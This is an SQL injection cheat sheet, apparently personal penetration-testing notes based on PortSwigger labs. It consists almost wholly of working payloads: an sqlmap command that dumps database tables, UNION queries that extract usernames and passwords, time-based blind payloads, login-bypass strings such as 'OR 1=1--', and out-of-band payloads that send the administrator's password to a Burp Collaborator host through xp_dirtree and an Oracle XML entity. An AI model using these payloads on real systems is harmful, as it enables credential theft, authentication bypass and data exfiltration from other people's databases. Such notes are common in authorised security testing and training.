# SQL Injection

## Reflected SQL Injection:</h2>
```bash
sqlmap --url https://$domain/filter?category=Lifestyle --dump --schema --tables --columns
Results:
Database: public
Table: users
[POC]:
https://$domain/filter?category=Lifestyle'+UNION+SELECT+username,+password+FROM+users--
```

### First detect numbers of columns
```sql
' ORDER BY 100-- # Error show columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # Show columns

' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

# Si obtienes las columnas pero el union no funciona intenta agregar data al principio
test' UNION SELECT 1, db_name(), 3--
...
# Oracle
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL, NULL FROM dual--
' UNION SELECT NULL, NULL, NULL FROM dual--

-- o #

```
### Second Find where holds strings data
```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```
## Version
```http2
Database type 	              Query
Microsoft, MySQL 	    SELECT @@version
Oracle 	                    SELECT * FROM v$version
PostgreSQL 	            SELECT version() 

'UNION SELECT 1,database(),3,4,5--
'UNION SELECT 1,db_name(),3,4,5--
```

## Blind SQL Injection:
```sql
';SELECT PG_SLEEP(5)--
'||pg_sleep(10)--
'SLEEP(2);--
'IF (1=1) waitfor delay '0:0:10'--
```

## Blind SQL injection using out-of-band (OAST) techniques

```sql
'; exec master..xp_dirtree '//SUBDOMAIN.burpcollaborator.net/a'--
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.SUBDOMAIN.burpcollaborator.net/a"')--
```
## SQL Based Errors
```sql
'IF (1=1) waitfor delay '0:0:10'--
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

## SQL Login
In nickname, email and password test for
```html
name'--
pass'--
'+OR+1=1--
'+OR+2=2--
'+OR+5=5--
'+OR+'E'='E'--
```


## Test cookies for "HTTP Request" - Blind:
```http2
  TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### Then for credentials.
```http2
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.
  ```
### CheatSheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
